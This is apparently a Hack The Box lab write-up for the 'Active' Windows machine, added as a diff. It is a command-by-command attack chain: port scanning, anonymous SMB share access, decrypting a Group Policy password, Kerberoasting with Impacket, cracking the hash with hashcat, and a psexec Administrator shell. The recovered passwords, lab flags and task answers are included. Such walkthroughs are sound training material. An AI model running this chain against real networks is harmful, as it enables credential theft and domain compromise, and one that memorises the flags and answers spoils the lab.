@@ -1,0 +1,42 @@
+--------------------------------------
+Active
+Windows · Easy
+Target IP Address
+10.10.10.100
+sudo apt update && sudo apt upgrade -y
+ping 10.10.10.100
+rustscan -a 10.10.10.100 --ulimit 5000 -b 1000 -- -p1-65535
+nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49153,49154,49155,49158,49152,49157,49165,49166,49168,47001 10.10.10.100
+echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts
+smbclient -L //10.10.10.100
+Task 1 - How many SMB shares are shared by the target? - 7
+Task 2 - What is the name of the share that allows anonymous read access? - Replication
+smbclient //10.10.10.100/Replication
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *
+Task 3 - Which file has encrypted account credentials in it? - Groups.xml
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+Task 4 - What is the decrpyted password for the SVC_TGS account? - GPPstillStandingStrong2k18
+The domain account SVC_TGS has the password GPPstillStandingStrong2k18
+smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
+smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
+smb: \> mget *
+Submit the flag located on the security user's desktop. - e0c1c4ba29c708ea23abfed09b7824e3
+Task 6 - Which service account on Active is vulnerable to Kerberoasting?
+ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+sAMAccountName: Administrator
+sAMAccountName: SVC_TGS
+https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py
+./GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
+./GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
+wget https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
+./GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -outputfile UsersSPN.txt
+gunzip rockyou.txt.gz
+hashcat -m 13100 UsersSPN.txt /usr/share/wordlists/rockyou.txt
+Ticketmaster1968
+./psexec.py active.htb/Administrator@10.10.10.100
+whoami
+type root.txt
+https://www.hackthebox.com/achievement/machine/303878/148
+--------------------------------------
